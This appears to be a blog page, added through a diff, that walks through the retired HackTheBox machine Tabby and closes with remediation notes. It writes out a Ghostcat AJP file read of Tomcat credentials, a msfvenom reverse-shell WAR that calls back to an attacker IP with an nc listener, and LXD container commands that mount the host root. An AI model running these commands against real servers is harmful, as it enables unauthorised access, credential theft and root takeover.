@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Tabby: Ghostcat file read to Tomcat deploy to LXD root — Lucky Thandel</title>
+<meta name="description" content="Ghostcat AJP read (CVE-2020-1938) leaks manager creds, a WAR deploy gets a shell, and LXD group membership mounts the host. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-20 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Tabby: Ghostcat file read to Tomcat deploy to LXD root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Tabby is a retired HackTheBox easy Linux machine chaining three distinct techniques into one ladder. Synopsis: Ghostcat AJP read (CVE-2020-1938) leaks manager creds, a WAR deploy gets a shell, and LXD group membership mounts the host.</p>
+<h2><span class="amber">$</span> Enumeration — HTTP plus AJP</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: spot Tomcat plus AJP 8009</span>
+nmap -sC -sV -oN tabby.nmap 10.10.10.194</pre>
+<p>HTTP (Tomcat) plus the AJP connector port 8009 — and an AJP port facing the network next to a Tomcat version in the Ghostcat range is the opening. Unfamiliar ports deserve one search each; 8009 plus Tomcat is a famous pair.</p>
+<h2><span class="amber">$</span> Foothold step one — Ghostcat file read</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: Ghostcat read of manager config</span>
+python3 ghostcat.py 10.10.10.194 8009 --read /WEB-INF/web.xml
+python3 ghostcat.py 10.10.10.194 8009 --read /manager/META-INF/context.xml
+python3 ghostcat.py 10.10.10.194 8009 --read /WEB-INF/tomcat-users.xml   # manager creds</pre>
+<p>The AJP file-read exploit pulls deployment descriptors and then tomcat-users.xml from the manager app, revealing manager credentials. File-read bugs that expose config are credential bugs wearing a different hat.</p>
+<h2><span class="amber">$</span> Foothold step two — WAR deploy</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: build WAR, deploy, catch shell</span>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f war &gt; shell.war
+# manager GUI (recovered creds) -&gt; Deploy -&gt; upload shell.war -&gt; browse /shell/
+nc -lvnp 4444   # shell as tomcat</pre>
+<p>Log into the Tomcat manager with the recovered creds, upload the malicious WAR, trigger it, catch the shell as the low-privilege tomcat user.</p>
+<h2><span class="amber">$</span> Privilege escalation — LXD group</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: privileged container, mount host</span>
+id   # tomcat user in the lxd group
+lxc image copy ubuntu:20.04 local --alias privesc
+lxc init privesc pwn -c security.privileged=true
+lxc config device add pwn host-root disk source=/ path=/mnt/root recursive=true
+lxc start pwn; lxc exec pwn /bin/sh
+# inside container: chroot /mnt/root /bin/bash; cat /root/root.txt</pre>
+<p>LXD group membership is root-equivalent: any member can launch a privileged container with the host filesystem mounted. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Brute-forcing the manager login (the creds are on disk via Ghostcat — read before guessing) and treating the AJP port as noise.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Upgrade Tomcat past Ghostcat, firewall AJP off the network, rotate creds in deployed configs, and never grant container groups to service accounts. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
